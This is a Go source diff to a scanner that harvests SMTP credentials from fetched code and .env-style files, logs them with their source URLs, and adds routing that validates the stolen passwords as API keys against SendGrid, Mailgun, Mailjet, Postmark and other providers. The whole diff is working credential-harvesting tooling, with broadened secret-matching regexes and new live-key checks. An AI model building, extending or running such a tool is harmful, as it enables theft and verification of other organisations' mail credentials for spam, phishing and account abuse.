@@ -3542,6 +3542,7 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 		a.logFound("SMTP", smtpLine, sourceURL)
 		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
+		a.routeProviderSMTP(host, user, pass, sourceURL)
 
 		if a.Config.SMTPTestEmail == "" {
 			return
@@ -4415,6 +4416,9 @@ func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
 		a.logFound("SMTP (AST)", smtpLine, sourceURL)
 		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
 
+		// Route to provider-specific API validator if host matches a known relay
+		a.routeProviderSMTP(host, user, pass, sourceURL)
+
 		// Test SMTP jika email target dikonfigurasi
 		if a.Config.SMTPTestEmail != "" {
 			a.testSMTPConnection(host, port, user, pass, from, sourceURL)
@@ -4581,34 +4585,41 @@ func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
 	configs := []map[string]string{}
 	config := make(map[string]string)
 
-	// Pattern untuk .env style
+	hostRe := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_SERVER|MAIL_SERVER|SMTP_HOSTNAME|MAIL_MAILER_HOST)\s*=\s*["']?([^"'\s]+)["']?`)
+	portRe := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT|SMTP_PORT_NUMBER)\s*=\s*["']?(\d+)["']?`)
+	userRe := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|MAILER_USERNAME|SMTP_LOGIN|MAIL_USER)\s*=\s*["']?([^"'\s]+)["']?`)
+	passRe := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASSWORD|SMTP_SECRET)\s*=\s*["']?([^"'\s]+)["']?`)
+	fromRe := regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM(?:_ADDRESS)?|MAILER_FROM|SENDER_EMAIL|MAIL_SENDER|FROM_EMAIL)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`)
+
 	lines := strings.Split(code, "\n")
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
-
-		// MAIL_HOST atau SMTP_HOST
-		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
-			config["host"] = strings.Trim(match[1], `"'`)
+		if strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
+			continue
 		}
-		// MAIL_PORT atau SMTP_PORT
-		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT)\s*=\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
-			config["port"] = match[1]
+		if m := hostRe.FindStringSubmatch(line); len(m) > 1 && config["host"] == "" {
+			config["host"] = strings.Trim(m[1], `"'`)
 		}
-		// MAIL_USERNAME atau SMTP_USER
-		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER|SMTP_USERNAME)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
-			config["user"] = strings.Trim(match[1], `"'`)
+		if m := portRe.FindStringSubmatch(line); len(m) > 1 && config["port"] == "" {
+			config["port"] = m[1]
 		}
-		// MAIL_PASSWORD atau SMTP_PASS
-		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS|SMTP_PASSWORD)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
-			config["pass"] = strings.Trim(match[1], `"'`)
+		if m := userRe.FindStringSubmatch(line); len(m) > 1 && config["user"] == "" {
+			config["user"] = strings.Trim(m[1], `"'`)
 		}
-		// MAIL_FROM
-		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM|MAIL_FROM_ADDRESS|SMTP_FROM)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
-			config["from"] = strings.Trim(match[1], `"'`)
+		if m := passRe.FindStringSubmatch(line); len(m) > 1 && config["pass"] == "" {
+			config["pass"] = strings.Trim(m[1], `"'`)
+		}
+		if m := fromRe.FindStringSubmatch(line); len(m) > 1 && config["from"] == "" {
+			config["from"] = strings.Trim(m[1], `"'`)
 		}
 	}
 
-	if len(config) >= 5 {
+	// from can fall back to user if it looks like an email
+	if config["from"] == "" && strings.Contains(config["user"], "@") {
+		config["from"] = config["user"]
+	}
+
+	if len(config) >= 4 && config["host"] != "" && config["pass"] != "" {
 		configs = append(configs, config)
 	}
 
@@ -4811,6 +4822,39 @@ func (a *AWSScanner) extractSMTPFromURL(code string) []map[string]string {
 		})
 	}
 	return configs
+}
+
+// routeProviderSMTP checks whether an extracted SMTP host belongs to a known
+// transactional-mail provider and, if so, validates the password (which is
+// usually the API key) via that provider's API.
+func (a *AWSScanner) routeProviderSMTP(host, user, pass, sourceURL string) {
+	h := strings.ToLower(host)
+	switch {
+	case strings.Contains(h, "smtp.sendgrid.net"):
+		// SendGrid: password IS the API key (username is always "apikey")
+		go a.CheckSendGrid(pass, sourceURL)
+	case strings.Contains(h, "smtp.mailgun.org") || strings.Contains(h, "smtp.eu.mailgun.org"):
+		// Mailgun: password is the API key (username is domain-specific user)
+		go a.CheckMailgun(pass, sourceURL)
+	case strings.Contains(h, "smtp.mandrillapp.com"):
+		// Mandrill: password is the API key
+		go a.CheckMandrill(pass, sourceURL)
+	case strings.Contains(h, "smtp.sparkpostmail.com"):
+		// SparkPost: password is the API key
+		go a.CheckSparkPost(pass, sourceURL)
+	case strings.Contains(h, "smtp-relay.brevo.com") || strings.Contains(h, "smtp-relay.sendinblue.com") || strings.Contains(h, "smtp.brevo.com"):
+		// Brevo/Sendinblue: password is the API key
+		go a.CheckBrevo(pass, sourceURL)
+	case strings.Contains(h, "smtp.postmarkapp.com"):
+		// Postmark: password is the server token
+		go a.CheckPostmark(pass, sourceURL)
+	case strings.Contains(h, "in-v3.mailjet.com"):
+		// Mailjet: username=API key, password=secret key
+		go a.CheckMailjet(user, pass, sourceURL)
+	case strings.Contains(h, "smtp.mailtrap.io") || strings.Contains(h, "live.smtp.mailtrap.io"):
+		// Mailtrap: password is the API token
+		go a.CheckMailtrap(pass, sourceURL)
+	}
 }
 
 // testSMTPConnection test koneksi SMTP yang ditemukan
